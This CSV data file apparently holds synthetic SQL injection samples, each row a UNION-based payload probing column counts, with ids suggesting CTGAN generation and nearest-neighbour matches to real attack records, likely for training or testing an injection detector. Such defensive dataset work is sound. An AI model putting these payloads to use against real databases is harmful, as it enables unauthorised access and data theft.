id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,union,"-3126   )    )    union all select 6718,6718,6718,6718,6718--",nearest_attack_euclidean,R000793,4.738941039519904
CTGAN_000002,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000468,5.335247278811776
CTGAN_000003,attack,union,"-7741'  )   where 8271  =  8271 union all select 8271,8271,8271,8271,8271,8271,8271#",nearest_attack_euclidean,R000666,3.7053842160326513
CTGAN_000004,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R001298,5.419092965926569
CTGAN_000005,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000926,4.892176357855167
CTGAN_000006,attack,union,"1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000818,5.575712528681018
CTGAN_000007,attack,union,"1'  )   where 8628  =  8628 union all select null,null,null--",nearest_attack_euclidean,R001315,4.4154851624294515
CTGAN_000008,attack,union,"1   )    )    as xvyi where 6701  =  6701 union all select null,null,null,null#",nearest_attack_euclidean,R000980,4.596146807344614
CTGAN_000009,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R001518,5.747568969722663
CTGAN_000010,attack,union,"-4413%'   )    )    union all select 1345,1345#",nearest_attack_euclidean,R001339,6.064177078374611
CTGAN_000011,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000287,4.776692526376159
CTGAN_000012,attack,union,"1' where 7445  =  7445 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001432,4.2870529965984225
CTGAN_000013,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000742,4.350477949268089
CTGAN_000014,attack,union,"1'  )   where 8628  =  8628 union all select null,null,null--",nearest_attack_euclidean,R001315,4.8822930685561605
CTGAN_000015,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R000953,7.277944947340771
CTGAN_000016,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001171,5.582887019391007
CTGAN_000017,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R001228,4.365613418249052
CTGAN_000018,attack,union,"-9774'   )    )     )   union all select 6954,6954,6954#",nearest_attack_euclidean,R000678,7.7312954845986575
CTGAN_000019,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R000953,3.607383372907099
CTGAN_000020,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000346,4.796973367259486
CTGAN_000021,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R001085,4.954285300269416
CTGAN_000022,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000354,6.083137486179975
CTGAN_000023,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000939,9.469794742392448
CTGAN_000024,attack,union,"-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#",nearest_attack_euclidean,R001046,4.39503562225145
CTGAN_000025,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R001518,8.465078685770996
CTGAN_000026,attack,union,-4331  )   as inpx where 9804  =  9804 union all select 9804#,nearest_attack_euclidean,R000652,4.24609317417828
CTGAN_000027,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R001085,4.5593202028764965
CTGAN_000028,attack,union,"1 where 4448  =  4448 union all select null,null,null,null,null#",nearest_attack_euclidean,R000751,5.331369447183155
CTGAN_000029,attack,union,"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--",nearest_attack_euclidean,R001117,7.613415158883875
CTGAN_000030,attack,union,"1""  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001378,6.711800803989269
